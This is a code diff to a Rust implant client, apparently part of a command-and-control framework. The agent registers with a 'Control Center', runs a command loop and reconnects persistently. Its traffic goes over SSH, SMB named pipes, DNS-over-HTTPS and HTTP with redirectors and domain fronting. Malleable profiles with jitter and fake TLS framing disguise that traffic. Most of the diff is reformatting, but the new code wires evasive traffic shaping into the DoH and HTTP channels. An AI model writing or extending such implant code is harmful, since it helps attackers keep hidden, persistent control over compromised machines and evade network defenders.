@@ -28,18 +28,18 @@
 //! use certificate pinning.
 
 use anyhow::{anyhow, Result};
+use common::forward_secrecy;
 use common::normalized_transport::{NormalizedTransport, Role, TrafficProfile};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
-use common::forward_secrecy;
 use common::{LockedSecret, Message, Transport};
 use ed25519_dalek::SigningKey;
 use log::{error, info, warn};
 use rand::rngs::OsRng;
 use rustls::ClientConfig;
 use std::sync::Arc;
+use std::time::Instant;
 use sysinfo::System;
 use tokio::net::TcpStream;
-use std::time::Instant;
 use tokio::time::{sleep, Duration};
 use tokio_rustls::TlsConnector;
 use uuid::Uuid;
@@ -54,6 +54,24 @@ const BAKED_MTLS_CERT: Option<&str> = option_env!("SYS_C_MTLS_CERT");
 const BAKED_MTLS_KEY: Option<&str> = option_env!("SYS_C_MTLS_KEY");
 
 const MAX_BACKOFF_SECS: u64 = 64;
+
+#[cfg(any(feature = "doh-transport", feature = "http-transport"))]
+fn malleable_profile_from_config(
+    cfg: &common::config::Config,
+) -> crate::malleable::MalleableProfile {
+    let mut profile = crate::malleable::MalleableProfile::default();
+    profile.global.user_agent = cfg.malleable_profile.user_agent.clone();
+    profile.global.sleep_time = cfg.sleep.base_interval_secs;
+    profile.global.sleep_time_ms = cfg.sleep.base_interval_ms;
+    profile.global.jitter = cfg.sleep.jitter_percent.min(100) as u8;
+    profile.dns.dns_suffix = cfg.malleable_profile.host_header.clone();
+    if let Some(doh_server_url) = cfg.malleable_profile.doh_server_url.as_ref() {
+        if !doh_server_url.trim().is_empty() {
+            profile.dns.headers.doh_server = doh_server_url.trim().to_string();
+        }
+    }
+    profile
+}
 
 /// Resolve the server address.
 ///
@@ -148,18 +166,18 @@ fn build_tls_client_config(
         let key_bytes = std::fs::read(key_path)
             .map_err(|e| anyhow!("reading mTLS client key {key_path}: {e}"))?;
 
-        let certs: Vec<CertificateDer<'static>> =
-            rustls_pemfile::certs(&mut cert_bytes.as_slice())
-                .collect::<std::result::Result<Vec<_>, _>>
-                ()
-                .map_err(|e| anyhow!("parsing mTLS client cert {cert_path}: {e}"))?;
+        let certs: Vec<CertificateDer<'static>> = rustls_pemfile::certs(&mut cert_bytes.as_slice())
+            .collect::<std::result::Result<Vec<_>, _>>()
+            .map_err(|e| anyhow!("parsing mTLS client cert {cert_path}: {e}"))?;
 
-        let key: PrivateKeyDer<'static> =
-            rustls_pemfile::private_key(&mut key_bytes.as_slice())
-                .map_err(|e| anyhow!("parsing mTLS client key {key_path}: {e}"))?
-                .ok_or_else(|| anyhow!("no private key found in {key_path}"))?;
+        let key: PrivateKeyDer<'static> = rustls_pemfile::private_key(&mut key_bytes.as_slice())
+            .map_err(|e| anyhow!("parsing mTLS client key {key_path}: {e}"))?
+            .ok_or_else(|| anyhow!("no private key found in {key_path}"))?;
 
-        info!("outbound-c: mTLS client certificate configured ({})", cert_path);
+        info!(
+            "outbound-c: mTLS client certificate configured ({})",
+            cert_path
+        );
         return builder
             .with_client_auth_cert(certs, key)
             .map_err(|e| anyhow!("configuring mTLS client cert: {e}"));
@@ -206,7 +224,13 @@ pub async fn build_outbound_transport(
                 // Requires ssh_host (and ssh_username + ssh_auth) in the
                 // malleable profile.
                 #[cfg(feature = "ssh-transport")]
-                if cfg.malleable_profile.ssh_host.as_deref().filter(|s| !s.is_empty()).is_some() {
+                if cfg
+                    .malleable_profile
+                    .ssh_host
+                    .as_deref()
+                    .filter(|s| !s.is_empty())
+                    .is_some()
+                {
                     info!(
                         "ssh-transport: ssh_host configured ({}); switching to SshTransport",
                         cfg.malleable_profile.ssh_host.as_deref().unwrap_or("?")
@@ -236,7 +260,10 @@ pub async fn build_outbound_transport(
                     info!(
                         "smb-pipe-transport: smb_pipe_enabled=true, host={}; \
                          attempting SmbPipeTransport",
-                        cfg.malleable_profile.smb_pipe_host.as_deref().unwrap_or("?")
+                        cfg.malleable_profile
+                            .smb_pipe_host
+                            .as_deref()
+                            .unwrap_or("?")
                     );
                     match crate::c2_smb::SmbPipeTransport::new(
                         &cfg.malleable_profile,
@@ -270,25 +297,28 @@ pub async fn build_outbound_transport(
                         .doh_server_url
                         .as_deref()
                         .filter(|s| !s.is_empty())
-                        .ok_or_else(|| anyhow!(
-                            "DoH transport requires a compatible server-side DNS-to-C2 bridge \
+                        .ok_or_else(|| {
+                            anyhow!(
+                                "DoH transport requires a compatible server-side DNS-to-C2 bridge \
                              which is not included. Set doh_server_url in config or disable \
                              dns_over_https."
-                        ))?;
+                            )
+                        })?;
                     info!(
                         "doh-transport: dns_over_https=true, server_url={}; switching to DohTransport",
                         server_url
                     );
                     let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
+                    let agent_profile = malleable_profile_from_config(cfg);
                     return Ok(Box::new(
                         crate::c2_doh::DohTransport::new(
-                            &Default::default(),           // agent malleable profile — DoH shaping uses defaults
+                            &agent_profile,
                             session,
                             agent_id.to_string(),
-                            Some(&cfg.malleable_profile),  // legacy config for host_header, doh_beacon_sentinel
+                            Some(&cfg.malleable_profile), // legacy config for host_header, doh_beacon_sentinel
                         )
-                            .await
-                            .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
+                        .await
+                        .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
                     ));
                 }
 
@@ -301,18 +331,19 @@ pub async fn build_outbound_transport(
                     let agent_id = _agent_id;
                     info!("http-transport: cdn_relay=true; switching to HttpTransport");
                     let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
+                    let agent_profile = malleable_profile_from_config(cfg);
                     return Ok(Box::new(
                         crate::c2_http::HttpTransport::new(
-                            None,     // agent malleable profile — loaded from server at runtime
+                            Some(&agent_profile),
                             session,
                             agent_id.to_string(),
                             _mesh_public_key,
                             Some(&cfg.malleable_profile),
-                            vec![],   // redirectors — populated via server push at runtime
-                            None,     // front_domain — populated via server push at runtime
+                            vec![], // redirectors — populated via server push at runtime
+                            None,   // front_domain — populated via server push at runtime
                         )
-                            .await
-                            .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
+                        .await
+                        .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
                     ));
                 }
             }
@@ -355,9 +386,7 @@ pub async fn build_outbound_transport(
     // When `traffic_profile = "tls"` the raw ciphertext is additionally wrapped
     // in fake TLS 1.2 application-data records by NormalizedTransport; the
     // real outer TLS already provides confidentiality and authentication.
-    let traffic_profile = config_result
-        .map(|c| c.traffic_profile)
-        .unwrap_or_default();
+    let traffic_profile = config_result.map(|c| c.traffic_profile).unwrap_or_default();
 
     match traffic_profile {
         TrafficProfile::Tls => {
@@ -433,7 +462,12 @@ async fn run_with_heartbeat(
         })
         .await?;
     info!("outbound-c: registered with Control Center, running command loop");
-    let mut agent = crate::Agent::new(transport, mesh_private_key, mesh_public_key)?;
+    let mut agent = crate::Agent::new(
+        transport,
+        agent_id.to_string(),
+        mesh_private_key,
+        mesh_public_key,
+    )?;
     agent.run().await
 }
 
@@ -452,14 +486,8 @@ async fn connect_once(
     mesh_public_key: [u8; 32],
     mesh_private_key: Arc<LockedSecret>,
 ) -> Result<()> {
-    let transport = build_outbound_transport(
-        addr,
-        secret,
-        cert_fp,
-        agent_id,
-        Some(mesh_public_key),
-    )
-    .await?;
+    let transport =
+        build_outbound_transport(addr, secret, cert_fp, agent_id, Some(mesh_public_key)).await?;
     run_with_heartbeat(transport, agent_id, mesh_public_key, mesh_private_key).await
 }
 
@@ -509,11 +537,11 @@ pub async fn run_forever() -> Result<()> {
     // during P2P link handshakes.
     let mesh_signing_key = SigningKey::generate(&mut OsRng);
     let mesh_public_key = mesh_signing_key.verifying_key().to_bytes();
-    let mesh_private_key = Arc::new(LockedSecret::new(
-        mesh_signing_key.to_bytes().as_ref(),
-    ));
-    info!("outbound-c: generated Ed25519 mesh keypair (pub={:02x}{:02x}...)",
-           mesh_public_key[0], mesh_public_key[1]);
+    let mesh_private_key = Arc::new(LockedSecret::new(mesh_signing_key.to_bytes().as_ref()));
+    info!(
+        "outbound-c: generated Ed25519 mesh keypair (pub={:02x}{:02x}...)",
+        mesh_public_key[0], mesh_public_key[1]
+    );
 
     let mut backoff = Duration::from_secs(1);
     let mut session_backoff = Duration::from_secs(2);
@@ -553,7 +581,14 @@ pub async fn run_forever() -> Result<()> {
         // Transport established — run the session.  When the session ends
         // (clean shutdown or disconnect), reconnect with a fresh 1 s backoff.
         let session_start = Instant::now();
-        match run_with_heartbeat(transport, &agent_id, mesh_public_key, mesh_private_key.clone()).await {
+        match run_with_heartbeat(
+            transport,
+            &agent_id,
+            mesh_public_key,
+            mesh_private_key.clone(),
+        )
+        .await
+        {
             Ok(()) => {
                 // Clean shutdown — respect it, do not reconnect.
                 info!("outbound-c: received Shutdown from Control Center, exiting.");
